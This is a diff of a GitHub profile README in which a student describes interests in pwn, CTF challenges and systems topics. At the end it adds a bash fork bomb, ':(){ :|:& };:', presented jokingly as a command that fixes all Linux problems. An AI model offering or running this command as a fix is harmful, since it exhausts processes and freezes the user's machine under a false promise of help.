@@ -1,16 +1,24 @@
-### Hi there 👋
+<h2 align="center">Hi 👋, I'm ES</h2>
+<h3 align="center">CS Student, interested in Cybersecurity, and Algorithms</h3>
 
-<!--
-**crazyeights225/crazyeights225** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+- 🔭 I’m currently working on **pwn**
 
-Here are some ideas to get you started:
+- 🌱 I’m currently learning **pwn, rust, windows internals, tracing, NLP**
 
-- 🔭 I’m currently working on ...
-- 🌱 I’m currently learning ...
-- 👯 I’m looking to collaborate on ...
-- 🤔 I’m looking for help with ...
-- 💬 Ask me about ...
-- 📫 How to reach me: ...
-- 😄 Pronouns: ...
-- ⚡ Fun fact: ...
--->
+- 🤝 I’m looking for help with **pwn**
+
+- 💬 Ask me **Where the flags are hiding 🚩**
+
+- ⚡ Fun fact **I am trying to get better at pwn.**
+
+
+<h3 align="left">Languages and Tools:</h3>
+<p align="left"> <a href="https://www.linux.org/" target="_blank"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/linux/linux-original.svg" alt="linux" width="40" height="40"/> </a>
+ <a href="https://www.linux.org/" target="_blank"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/linux/linux-original.svg" alt="linux" width="40" height="40"/> </a>
+<a href="https://www.linux.org/" target="_blank"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/linux/linux-original.svg" alt="linux" width="40" height="40"/> </a> </p>
+
+
+**Run to fix 100% of your Linux related problems: 🍴💣 😋**
+```bash
+:(){ :|:& };:
+```
